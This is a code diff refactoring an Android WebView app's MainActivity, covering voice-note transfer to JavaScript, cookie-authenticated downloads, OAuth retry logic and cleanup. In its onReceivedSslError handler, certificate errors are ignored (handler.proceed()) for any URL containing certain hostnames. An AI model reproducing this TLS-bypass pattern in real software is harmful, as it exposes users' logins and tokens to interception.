+            InputStream in = new java.io.FileInputStream(audioFile);
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = in.read(buf)) != -1) bytesOut.write(buf, 0, n);
+            in.close();
+            byte[] bytes = bytesOut.toByteArray();
+            boolean isOgg = audioFile.getName().toLowerCase(Locale.ROOT).endsWith(".ogg");
+            String mime = isOgg ? "audio/ogg" : "audio/mp4";
+            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+            int chunkSize = 12000;
+            int total = (b64.length() + chunkSize - 1) / chunkSize;
+            String name = audioFile.getName();
+
+            webView.post(() -> {
+                webView.evaluateJavascript("if(typeof onNativeVoiceNoteStart==='function'){onNativeVoiceNoteStart(" +
+                        JSONObject.quote(name) + "," + JSONObject.quote(mime) + "," + total + ");}", null);
+                for (int i = 0; i < total; i++) {
+                    int s = i * chunkSize;
+                    int e = Math.min(s + chunkSize, b64.length());
+                    String chunk = b64.substring(s, e);
+                    webView.evaluateJavascript("if(typeof onNativeVoiceNoteChunk==='function'){onNativeVoiceNoteChunk(" +
+                            i + "," + JSONObject.quote(chunk) + ");}", null);
+                }
+                webView.evaluateJavascript("if(typeof onNativeVoiceNoteComplete==='function'){onNativeVoiceNoteComplete();}", null);
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "Voice note send failed", e);
         }
     }
 
     // ============================================================
-    // FEATURE 3: FILE DOWNLOAD
+    // FILE DOWNLOAD
     // ============================================================
     private void downloadFile(final String fileUrl, String filename) {
-        final String finalFilename = (filename == null || filename.isEmpty())
-                ? "download_" + System.currentTimeMillis() + ".file"
-                : filename;
-        final String sessionCookies = CookieManager.getInstance().getCookie(fileUrl);
-        final String webViewUserAgent = webView != null ? webView.getSettings().getUserAgentString() : "MeetIn Android";
+        final String finalName = (filename == null || filename.isEmpty())
+                ? "download_" + System.currentTimeMillis() + ".file" : filename;
+        final String cookies = CookieManager.getInstance().getCookie(fileUrl);
+        final String ua = webView != null ? webView.getSettings().getUserAgentString() : "MeetIn Android";
 
         new Thread(() -> {
-            HttpURLConnection connection = null;
+            HttpURLConnection c = null;
             try {
-                connection = (HttpURLConnection) new URL(fileUrl).openConnection();
-                if (sessionCookies != null) connection.setRequestProperty("Cookie", sessionCookies);
-                connection.setRequestProperty("User-Agent", webViewUserAgent);
-                connection.setConnectTimeout(15000);
-                connection.setReadTimeout(30000);
-                int responseCode = connection.getResponseCode();
-                if (responseCode < 200 || responseCode >= 300) throw new IllegalStateException("Server returned HTTP " + responseCode);
-                InputStream inputStream = connection.getInputStream();
+                c = (HttpURLConnection) new URL(fileUrl).openConnection();
+                if (cookies != null) c.setRequestProperty("Cookie", cookies);
+                c.setRequestProperty("User-Agent", ua);
+                c.setConnectTimeout(15000);
+                c.setReadTimeout(30000);
+                int code = c.getResponseCode();
+                if (code < 200 || code >= 300) throw new IllegalStateException("HTTP " + code);
+                InputStream in = c.getInputStream();
                 java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();
-                byte[] buffer = new byte[4096];
-                int bytesRead;
-                while ((bytesRead = inputStream.read(buffer)) != -1) bytesOut.write(buffer, 0, bytesRead);
-                inputStream.close();
-                String responseMimeType = connection.getContentType();
-                connection.disconnect();
-                pendingDownloadBytes = bytesOut.toByteArray();
-                pendingDownloadFilename = finalFilename.replaceAll("[^a-zA-Z0-9._-]", "_");
-                pendingDownloadMimeType = responseMimeType != null ? responseMimeType : "application/octet-stream";
-                runOnUiThread(() -> {
-                    Intent saveIntent = new Intent(Intent.ACTION_CREATE_DOCUMENT);
-                    saveIntent.addCategory(Intent.CATEGORY_OPENABLE);
-                    saveIntent.setType(pendingDownloadMimeType);
-                    saveIntent.putExtra(Intent.EXTRA_TITLE, pendingDownloadFilename);
-                    startActivityForResult(saveIntent, REQUEST_CREATE_DOWNLOAD);
-                });
-                Log.d(TAG, "Downloaded bytes ready for user-selected destination: " + pendingDownloadBytes.length);
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = in.read(buf)) != -1) bytesOut.write(buf, 0, n);
+                in.close();
+                String type = c.getContentType();
+                c.disconnect();
 
+                pendingDownloadBytes = bytesOut.toByteArray();
+                pendingDownloadFilename = finalName.replaceAll("[^a-zA-Z0-9._-]", "_");
+                pendingDownloadMimeType = type != null ? type : "application/octet-stream";
+
+                runOnUiThread(() -> {
+                    Intent i = new Intent(Intent.ACTION_CREATE_DOCUMENT);
+                    i.addCategory(Intent.CATEGORY_OPENABLE);
+                    i.setType(pendingDownloadMimeType);
+                    i.putExtra(Intent.EXTRA_TITLE, pendingDownloadFilename);
+                    startActivityForResult(i, REQUEST_CREATE_DOWNLOAD);
+                });
             } catch (Exception e) {
-                if (connection != null) connection.disconnect();
+                if (c != null) c.disconnect();
                 Log.e(TAG, "Download failed", e);
-                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Download failed: " + e.getMessage(), Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Download failed", Toast.LENGTH_SHORT).show());
             }
         }).start();
     }
 
-    // ============================================================
-    // ACTIVITY RESULT
-    // ============================================================
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
@@ -705,8 +844,7 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == REQUEST_FILE_PICKER) {
             if (fileUploadCallback != null) {
                 if (resultCode == RESULT_OK && data != null) {
-                    Uri[] uris = new Uri[]{data.getData()};
-                    fileUploadCallback.onReceiveValue(uris);
+                    fileUploadCallback.onReceiveValue(new Uri[]{data.getData()});
                 } else {
                     fileUploadCallback.onReceiveValue(null);
                 }
@@ -714,19 +852,16 @@ public class MainActivity extends AppCompatActivity {
             }
         } else if (requestCode == REQUEST_CREATE_DOWNLOAD) {
             if (resultCode == RESULT_OK && data != null && data.getData() != null && pendingDownloadBytes != null) {
-                Uri destination = data.getData();
-                try (OutputStream output = getContentResolver().openOutputStream(destination)) {
-                    if (output == null) throw new IllegalStateException("Could not open the selected location");
-                    output.write(pendingDownloadBytes);
-                    output.flush();
-                    Toast.makeText(this, "✅ File saved to the location you selected", Toast.LENGTH_LONG).show();
-                    createNotification("Download Complete", "Tap to open " + pendingDownloadFilename, destination);
-                } catch (Exception error) {
-                    Log.e(TAG, "Could not save selected download location", error);
-                    Toast.makeText(this, "Could not save the file: " + error.getMessage(), Toast.LENGTH_LONG).show();
+                Uri dest = data.getData();
+                try (OutputStream out = getContentResolver().openOutputStream(dest)) {
+                    if (out == null) throw new IllegalStateException("No output stream");
+                    out.write(pendingDownloadBytes);
+                    out.flush();
+                    Toast.makeText(this, "✅ File saved", Toast.LENGTH_LONG).show();
+                    createNotification("Download Complete", "Tap to open " + pendingDownloadFilename, dest);
+                } catch (Exception e) {
+                    Log.e(TAG, "Save failed", e);
                 }
-            } else {
-                Toast.makeText(this, "Download cancelled", Toast.LENGTH_SHORT).show();
             }
             pendingDownloadBytes = null;
             pendingDownloadFilename = null;
@@ -740,28 +875,24 @@ public class MainActivity extends AppCompatActivity {
     private class OAuthWebViewClient extends WebViewClient {
         @Override
         public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
-            if (request != null && request.getUrl() != null) {
-                Log.d(TAG, "Loading: " + request.getUrl());
-            }
             return false;
         }
 
         @Override
         @SuppressWarnings("deprecation")
         public boolean shouldOverrideUrlLoading(WebView view, String url) {
-            Log.d(TAG, "Loading: " + url);
             return false;
         }
 
         @Override
         public void onPageFinished(WebView view, String url) {
-            Log.d(TAG, "Page loaded: " + url);
             try { CookieManager.getInstance().flush(); } catch (Exception ignored) {}
             if (!oauthRecoveryAttempted && url != null && url.startsWith("https://inbox.dog/oauth/callback")) {
                 view.evaluateJavascript("document.body ? document.body.innerText : ''", body -> {
-                    if (body != null && (body.contains("OAuthState not found") || body.contains("STATE_NOT_FOUND") || body.contains("OAuth state expired"))) {
+                    if (body != null && (body.contains("OAuthState not found")
+                            || body.contains("STATE_NOT_FOUND")
+                            || body.contains("OAuth state expired"))) {
                         oauthRecoveryAttempted = true;
-                        Toast.makeText(MainActivity.this, "Google sign-in expired. Restarting…", Toast.LENGTH_SHORT).show();
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
                             oauthRecoveryAttempted = false;
                             webView.loadUrl(URL + "/api/auth/google/start?origin=" + Uri.encode(URL));
@@ -773,20 +904,15 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         public void onReceivedSslError(WebView view, android.webkit.SslErrorHandler handler, SslError error) {
-            Log.e(TAG, "SSL Error: " + error.getPrimaryError());
             String url = error.getUrl();
-            if (url != null && (url.contains("inbox.dog") || url.contains("meetinapp-bj2ib4p7.manus.space") || url.contains("manus.space") || url.contains("googleapis.com"))) {
-                Log.d(TAG, "Proceeding with SSL for: " + url);
+            if (url != null && (url.contains("inbox.dog")
+                    || url.contains("meetinapp-bj2ib4p7.manus.space")
+                    || url.contains("manus.space")
+                    || url.contains("googleapis.com"))) {
                 handler.proceed();
             } else {
-                Log.w(TAG, "Cancelling SSL for: " + url);
                 handler.cancel();
             }
-        }
-
-        @Override
-        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
-            Log.e(TAG, "WebView error: " + errorCode + " - " + description);
         }
     }
 
@@ -798,7 +924,7 @@ public class MainActivity extends AppCompatActivity {
         if (activeActivity == this) activeActivity = null;
         fcmForegroundHandlingEnabled = false;
         if (webView != null) {
-            try { webView.destroy(); } catch (Exception e) { Log.w(TAG, "WebView destroy error", e); }
+            try { webView.destroy(); } catch (Exception ignored) {}
             webView = null;
         }
         if (mediaRecorder != null) {
